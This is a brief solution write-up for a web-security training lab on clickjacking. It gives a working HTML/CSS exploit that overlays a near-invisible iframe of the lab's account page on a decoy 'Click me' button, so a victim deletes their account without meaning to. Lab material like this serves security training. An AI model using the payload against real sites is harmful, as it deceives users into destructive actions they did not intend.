# Lab: Basic clickjacking with CSRF token protection

Use the following exploit body to align a button over the Delete Account button to trick the user into deleting their account:
```
<style>
    iframe {
        position:relative;
        width:700px;
        height:600px;
        opacity:0.0001;
        z-index:2;
        }
    div {
        position:absolute;
        top:500px;
        left:60px;
        z-index:1;
        }
</style>
<div>Click me</div>
<iframe src="https://ac251f611f385bdac09e11da008d0065.web-security-academy.net/my-account"></iframe>
```
